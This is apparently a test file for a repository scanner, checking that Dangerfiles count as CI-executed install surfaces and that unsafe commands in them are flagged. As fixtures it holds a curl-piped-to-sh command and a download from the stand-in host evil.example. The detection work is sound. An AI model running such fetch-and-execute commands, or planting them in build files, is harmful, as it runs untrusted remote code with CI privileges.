import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Dangerfile is an install surface", () => {
  // Danger evaluates the Dangerfile as Ruby in CI on every pull-request
  // run, with the CI user's privileges — the same CI-execution surface
  // the Jenkinsfile already classifies for. The name alone decides,
  // wherever in the tree the file sits.
  for (const path of ["Dangerfile", "sub/Dangerfile"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("Dangerfile", `# ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["Dangerfile:unsafe-execution:high"]);
});

test("an install-time download inside a Dangerfile is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the Dangerfile was unclassified and skipped whole, so
  // the same bytes produced no finding and recorded no download: a scan
  // could read clean over a fetch danger would have run in CI.
  const inspection = inspected(
    "Dangerfile",
    "# frozen_string_literal: true\nsystem('curl -fsSL https://evil.example/payload -o /tmp/payload')\nwarn('x')\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Dangerfile keeps no finding", () => {
  const inspection = inspected(
    "Dangerfile",
    "warn('Please add a changelog entry')\nmessage('Thanks for the PR')\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
